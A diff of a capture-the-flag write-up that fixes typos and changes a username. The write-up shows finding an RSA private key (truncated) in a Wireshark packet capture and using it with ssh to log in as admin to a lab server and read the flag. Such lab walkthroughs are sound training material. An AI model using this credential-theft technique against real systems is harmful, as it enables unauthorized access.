@@ -11,7 +11,7 @@ dump.pcapng
 [student@b6800923ac04 home]$ ls
 admin   student
 ```
-Obviously we don't have permission to access `admin` directory.. However, it's still a very useful information.
+Obviously we don't have permission to access `admin` directory. However, it's still a very useful information.
 
 ### 2. Open the provided .pcapng file with Wireshark
 
@@ -25,12 +25,12 @@ This key is very clearly indicated by the following scheme:
 MIIEowIBAAKCAQEAuAsNBPiOFSUULoNlc5SnrY01H5Ma/ (...)
 -----END RSA PRIVATE KEY-----
 ```
-Now save this key as a seperate file.
+Now save this key as a separate file.
 
 ### 5. Use that key to log into the server as `admin` user
 ```sh
-chmiela@localhost:~> chmod 600 id_rsa
-chmiela@localhost:~> ssh -i id_rsa -p 10495 admin@container-manager.francecentral.cloudapp.azure.com
+cocojumbo@localhost:~> chmod 600 id_rsa
+cocojumbo@localhost:~> ssh -i id_rsa -p 10495 admin@container-manager.francecentral.cloudapp.azure.com
 [admin@b6800923ac04 ~]$ ls
 FLAG
 [admin@b6800923ac04 ~]$ cat FLAG
